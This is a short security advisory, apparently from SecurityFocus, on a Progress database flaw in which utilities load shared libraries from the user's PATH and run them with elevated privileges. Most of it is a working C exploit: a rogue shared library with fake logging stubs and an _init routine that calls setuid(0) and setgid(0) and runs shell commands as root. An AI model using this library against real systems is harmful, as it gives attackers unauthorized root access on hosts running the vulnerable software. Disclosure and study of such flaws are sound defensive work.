source: http://www.securityfocus.com/bid/7916/info

It has been reported that Progress database does not properly handle untrusted input when opening shared libraries. Specifically, the dlopen() function used by several Progress utilities checks the user's PATH environment variable when including shared object libraries. If any shared objects are found, Progress will load and execute them. Due to this, an attacker may be able to gain unauthorized privileges.

Any library code loaded will execute with elevated privileges. 

#include <stdio.h>
#include <string.h>

// If you wanted to get creative you can hack out some fake functions for
// use later ... but theres no need... just use _init

int ehnLogOpen(int argc, char * const argv[], const char *optstring) {
printf("This is a fake ehnLogOpen \n");
}
int ehnLogClose(int argc, char * const argv[], const char *optstring) {
printf("This is a fake ehnLogClose\n");
}

_init() {
setuid(0);
setgid(0);
printf("bullshit library loaded\n");
system("/usr/bin/id > /tmp/p00p");
system("cat /tmp/p00p");
} 